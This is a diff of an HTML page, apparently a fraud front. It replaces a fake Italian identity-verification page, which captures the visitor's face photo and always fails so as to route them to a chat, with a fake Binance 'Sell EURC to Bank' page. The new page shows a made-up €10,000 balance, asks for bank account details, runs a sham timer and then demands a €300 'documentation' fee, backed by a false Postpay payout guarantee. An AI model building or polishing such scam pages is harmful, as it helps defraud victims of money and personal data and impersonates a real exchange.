@@ -1,242 +1,203 @@
-<!doctype html>
-<html lang="it">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>IBAN PROFITS ACCESS - Verifica Identità</title>
+  <meta charset="UTF-8">
+  <title>Sell EURC to Bank</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    :root {
-      --bg: #f6f8fb;
-      --card: #ffffff;
-      --accent: #0b66c3;
-      --muted: #6b7280;
-      --error: #d64545;
-      font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #0b0f1a;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      position: relative;
     }
-    body { margin:0; background:linear-gradient(180deg,#eef3fb 0%, var(--bg) 100%); color:#111827; }
-    .container { max-width:880px; margin:48px auto; padding:24px; }
-    .card { background:var(--card); border-radius:10px; box-shadow:0 6px 24px rgba(14,30,37,0.08); padding:28px; display:grid; grid-template-columns:1fr 360px; gap:24px; }
-    header.logo { display:flex; align-items:center; gap:12px; margin-bottom:8px; }
-    h1 { margin:0; font-size:20px; color:#0f1724; }
-    p.lead { margin:8px 0 18px 0; color:var(--muted); font-size:14px; }
-    .consent { background:#fafbff; border:1px solid #e6eefc; padding:12px; border-radius:8px; margin-bottom:14px; font-size:13px; color:#243248; }
-    .controls { display:flex; gap:8px; margin-bottom:12px; flex-wrap:wrap; }
-    button, .btn { background:var(--accent); color:#fff; border:none; padding:10px 14px; border-radius:8px; cursor:pointer; font-weight:600; font-size:14px; }
-    .btn.secondary { background:transparent; border:1px solid #cfe3fb; color:var(--accent); }
-    .right { padding:12px; border-left:1px solid #f1f5f9; }
-    video, img.preview { width:100%; height:220px; object-fit:cover; border-radius:8px; background:#e9eef6; border:1px solid #e6eefc; }
-    input[type="file"] { display:none; }
-    .progress { height:12px; background:#eef2ff; border-radius:8px; overflow:hidden; margin-top:12px; display:none; }
-    .progress > i { display:block; height:100%; background: linear-gradient(90deg,var(--accent), #5aa3ff); width:0%; transition: width 0.3s linear; }
-    .result { margin-top:14px; padding:12px; border-radius:8px; font-size:14px; display:none; }
-    .result.error { background:#fff3f3; color:var(--error); border:1px solid #ffd6d6; }
-    .result.info { background:#f0f7ff; color:#0b66c3; border:1px solid #dbeeff; }
-    .footnote { font-size:12px; color:var(--muted); margin-top:12px; }
-    small.legal { display:block; margin-top:8px; color:var(--muted); }
-    @media (max-width:900px) { .card { grid-template-columns:1fr; } .right { border-left:none; border-top:1px solid #f1f5f9; padding-top:18px; } }
+    .app {
+      background-color: #0b0f1a;
+      width: 100%;
+      max-width: 420px;
+      padding: 30px;
+      box-sizing: border-box;
+      border-radius: 20px;
+    }
+    .logo {
+      text-align: center;
+      font-size: 1.8em;
+      font-weight: bold;
+      margin-bottom: 10px;
+      color: #f3ba2f;
+    }
+    .eurc-logo {
+      width: 60px;
+      height: 60px;
+      background-color: #1a4aff;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-size: 1.5em;
+      margin: 0 auto 10px;
+    }
+    .balance {
+      text-align: center;
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+    .slide-button {
+      background-color: #f3ba2f;
+      color: #0b0f1a;
+      padding: 14px;
+      border-radius: 50px;
+      text-align: center;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 30px;
+    }
+    .section {
+      display: none;
+      margin-bottom: 20px;
+    }
+    .label {
+      font-weight: bold;
+      margin-bottom: 5px;
+      color: #f3ba2f;
+    }
+    .value, input {
+      margin-bottom: 15px;
+      word-break: break-word;
+      font-size: 1em;
+      color: white;
+      background-color: #1a1f2b;
+      border: none;
+      border-radius: 6px;
+      padding: 10px;
+      width: 100%;
+    }
+    .bank-options {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 15px;
+    }
+    .bank-button {
+      flex: 1;
+      background-color: #f3ba2f;
+      color: #0b0f1a;
+      padding: 10px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      text-align: center;
+    }
+    .button {
+      background-color: #f3ba2f;
+      color: #0b0f1a;
+      padding: 14px;
+      border: none;
+      border-radius: 6px;
+      width: 100%;
+      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .error {
+      background-color: #1a1f2b;
+      padding: 20px;
+      border-radius: 10px;
+      margin-top: 20px;
+    }
+    .error-icon {
+      color: red;
+      font-size: 1.2em;
+      margin-bottom: 10px;
+    }
+    .support-button {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      background-color: #f3ba2f;
+      color: #0b0f1a;
+      padding: 10px 14px;
+      border-radius: 6px;
+      font-weight: bold;
+      text-decoration: none;
+      z-index: 999;
+    }
+    .disclaimer {
+      font-size: 0.85em;
+      color: #ccc;
+      margin-top: 20px;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="card" role="main" aria-labelledby="verify-title">
-      <div>
-        <header class="logo" aria-hidden="true">
-          <svg width="44" height="44" viewBox="0 0 24 24" fill="none" aria-hidden="true">
-            <rect width="24" height="24" rx="6" fill="#0b66c3"></rect>
-            <path d="M7 12h10" stroke="#fff" stroke-width="1.5" stroke-linecap="round"/>
-            <path d="M7 8h10" stroke="#fff" stroke-width="1.5" stroke-linecap="round" opacity="0.8"/>
-          </svg>
-          <div style="display:flex;flex-direction:column">
-            <strong style="font-size:15px">IBAN PROFITS ACCESS</strong>
-            <small style="color:var(--muted)">Verifica identità sicura</small>
-          </div>
-        </header>
+  <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" class="support-button">Contact Support</a>
 
-        <h1 id="verify-title">Verifica identità</h1>
-        <p class="lead">Completa i passaggi di seguito per confermare la tua identità. Questo processo è sicuro e rispetta la privacy.</p>
+  <div class="app">
+    <div class="eurc-logo">€</div>
+    <div class="logo">BINANCE</div>
+    <div class="balance">€10,000 EURC</div>
+    <div class="slide-button" onclick="showSellPreview()">SELL TO BANK</div>
 
-        <div class="consent" role="group" aria-label="Consenso">
-          <strong>Consenso richiesto</strong>
-          <div style="margin-top:6px;color:var(--muted);font-size:13px;">
-            Procedendo acconsenti alla cattura temporanea di una foto per la verifica automatica dell'identità. Le immagini non verranno conservate senza il tuo consenso esplicito. Consulta la nostra <a href="#" style="color:var(--accent);text-decoration:none;margin-left:6px">informativa privacy</a>.
-          </div>
-        </div>
-
-        <label style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
-          <input id="consentCheckbox" type="checkbox" aria-required="true" />
-          <span style="font-size:14px;color:var(--muted)">Do il consenso alla cattura e verifica della mia foto</span>
-        </label>
-
-        <div class="controls" aria-hidden="false">
-          <label class="btn secondary" id="use-camera-btn" title="Scatta una foto" role="button" tabindex="0">Usa fotocamera</label>
-
-          <label class="btn secondary upload" title="Carica immagine">
-            <span>Carica foto</span>
-            <input type="file" id="fileInput" accept="image/*" />
-          </label>
-
-          <button id="approveBtn" class="btn" aria-disabled="true">Approva</button>
-        </div>
-
-        <small class="legal">Procedi solo se sei il titolare del documento. Non caricare foto di terze persone senza autorizzazione.</small>
+    <div class="section" id="sellPreview">
+      <div class="label">Select your bank</div>
+      <div class="bank-options">
+        <div class="bank-button" onclick="selectBank('UniCredit')">UniCredit</div>
+        <div class="bank-button" onclick="selectBank('Postpay')">Postpay</div>
       </div>
+      <input type="text" placeholder="Account name">
+      <input type="text" placeholder="Account number">
+      <button class="button" onclick="startConfirmation()">CONFIRM ORDER</button>
+    </div>
 
-      <aside class="right" aria-labelledby="preview-heading">
-        <h2 id="preview-heading" style="margin:0 0 8px 0;font-size:15px">Anteprima</h2>
-        <div id="previewArea">
-          <video id="video" autoplay playsinline style="display:none" aria-hidden="true"></video>
-          <img id="previewImage" class="preview" alt="Anteprima foto caricata o catturata" />
-          <div style="margin-top:8px;color:var(--muted)">Suggerimento: assicurati che il viso sia ben illuminato e visibile. Rimuovi cappelli e occhiali da sole.</div>
-        </div>
+    <div class="section" id="confirmation">
+      <p>Please wait while we process your order...</p>
+      <p id="timer">Time remaining: 80s</p>
+    </div>
 
-        <div class="progress" id="progressBar" role="progressbar" aria-valuemin="0" aria-valuemax="100">
-          <i id="progressFill"></i>
-        </div>
-
-        <div class="result info" id="infoBox" role="status" aria-live="polite" style="display:none"></div>
-        <div class="result error" id="errorBox" role="alert" aria-live="assertive" style="display:none"></div>
-
-        <div class="footnote">
-          Assistenza: <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank" rel="noopener noreferrer">Contatta il supporto</a>
-        </div>
-      </aside>
+    <div class="section" id="errorSection">
+      <div class="error">
+        <div class="error-icon">⚠️ THE ORDER NEEDS €300 FOR FULL DOCUMENTATION AND BADGE ID AS LICENSE 🪪</div>
+        <p>The investment system will verify immediate release of €10,000 to your account details.</p>
+        <button class="button">PAY NOW</button>
+      </div>
+      <div class="disclaimer">
+        Your personal support will help you through the payment.<br>
+        POSTPAY guarantees 100% payment if €10,000 is not received after €300 deposit for full insurance documentation.
+      </div>
     </div>
   </div>
 
   <script>
-    (function () {
-      const useCameraBtn = document.getElementById('use-camera-btn');
-      const fileInput = document.getElementById('fileInput');
-      const previewImg = document.getElementById('previewImage');
-      const video = document.getElementById('video');
-      const approveBtn = document.getElementById('approveBtn');
-      const consentCheckbox = document.getElementById('consentCheckbox');
-      const progressBar = document.getElementById('progressBar');
-      const progressFill = document.getElementById('progressFill');
-      const infoBox = document.getElementById('infoBox');
-      const errorBox = document.getElementById('errorBox');
+    function showSellPreview() {
+      document.getElementById('sellPreview').style.display = 'block';
+    }
 
-      let stream = null;
-      let currentImageBlob = null;
+    function selectBank(bank) {
+      alert("Bank selected: " + bank);
+    }
 
-      function resetMessages() {
-        infoBox.style.display = 'none';
-        errorBox.style.display = 'none';
-      }
+    function startConfirmation() {
+      document.getElementById('sellPreview').style.display = 'none';
+      document.getElementById('confirmation').style.display = 'block';
 
-      function setPreviewImageFromBlob(blob) {
-        const url = URL.createObjectURL(blob);
-        previewImg.src = url;
-        previewImg.style.display = 'block';
-        video.style.display = 'none';
-        currentImageBlob = blob;
-      }
-
-      useCameraBtn.addEventListener('click', async () => {
-        resetMessages();
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-          errorBox.textContent = 'La fotocamera non è disponibile in questo browser.';
-          errorBox.style.display = 'block';
-          return;
+      let time = 80;
+      const timerEl = document.getElementById('timer');
+      const interval = setInterval(() => {
+        timerEl.textContent = `Time remaining: ${time}s`;
+        time--;
+        if (time < 0) {
+          clearInterval(interval);
+          document.getElementById('confirmation').style.display = 'none';
+          document.getElementById('errorSection').style.display = 'block';
         }
-        try {
-          stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-          video.srcObject = stream;
-          video.style.display = 'block';
-          previewImg.style.display = 'none';
-          useCameraBtn.textContent = 'Cattura foto';
-          useCameraBtn.onclick = captureFromVideo;
-        } catch (err) {
-          console.error(err);
-          errorBox.textContent = 'Impossibile accedere alla fotocamera. Consenti i permessi o usa l\'opzione di caricamento.';
-          errorBox.style.display = 'block';
-        }
-      });
-
-      function captureFromVideo() {
-        if (!video || !stream) return;
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob((blob) => {
-          setPreviewImageFromBlob(blob);
-          stream.getTracks().forEach(t => t.stop());
-          stream = null;
-          useCameraBtn.textContent = 'Usa fotocamera';
-          useCameraBtn.onclick = null;
-        }, 'image/jpeg', 0.92);
-      }
-
-      fileInput.addEventListener('change', (ev) => {
-        resetMessages();
-        const f = ev.target.files && ev.target.files[0];
-        if (!f) return;
-        if (!f.type.startsWith('image/')) {
-          errorBox.textContent = 'Carica un file immagine valido.';
-          errorBox.style.display = 'block';
-          return;
-        }
-        setPreviewImageFromBlob(f);
-      });
-
-      function updateApproveState() {
-        const enabled = consentCheckbox.checked && (currentImageBlob || previewImg.src);
-        approveBtn.disabled = !enabled;
-        approveBtn.setAttribute('aria-disabled', (!enabled).toString());
-      }
-      consentCheckbox.addEventListener('change', updateApproveState);
-
-      approveBtn.addEventListener('click', async () => {
-        resetMessages();
-        updateApproveState();
-        if (!consentCheckbox.checked) {
-          errorBox.textContent = 'Per favore, fornisci il consenso per procedere.';
-          errorBox.style.display = 'block';
-          return;
-        }
-        if (!currentImageBlob && !previewImg.src) {
-          errorBox.textContent = 'Carica o cattura prima una foto.';
-          errorBox.style.display = 'block';
-          return;
-        }
-
-        // Simulated verification progress (10 seconds)
-        progressBar.style.display = 'block';
-        progressFill.style.width = '0%';
-        infoBox.style.display = 'block';
-        infoBox.textContent = 'Verifica in corso — attendere prego.';
-        errorBox.style.display = 'none';
-
-        let seconds = 10;
-        const start = Date.now();
-        const interval = 100;
-        const total = seconds * 1000;
-        const timer = setInterval(() => {
-          const elapsed = Date.now() - start;
-          const pct = Math.min(100, Math.round((elapsed / total) * 100));
-          progressFill.style.width = pct + '%';
-          progressBar.setAttribute('aria-valuenow', pct.toString());
-          if (elapsed >= total) {
-            clearInterval(timer);
-            progressFill.style.width = '100%';
-            progressBar.style.display = 'none';
-            infoBox.style.display = 'none';
-
-            // Safe, professional next-step message: do not include payment demands
-            errorBox.innerHTML = '<strong>Verifica non completata automaticamente.</strong> Per motivi di sicurezza è richiesto un ulteriore controllo. Per assistenza e istruzioni contatta il supporto: <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" target="_blank" rel="noopener noreferrer">Apri chat supporto</a>.';
-            errorBox.style.display = 'block';
-          }
-        }, interval);
-      });
-
-      const observer = new MutationObserver(updateApproveState);
-      observer.observe(previewImg, { attributes: true, attributeFilter: ['src'] });
-      updateApproveState();
-
-      window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
-    })();
+      }, 1000);
+    }
   </script>
 </body>
 </html>
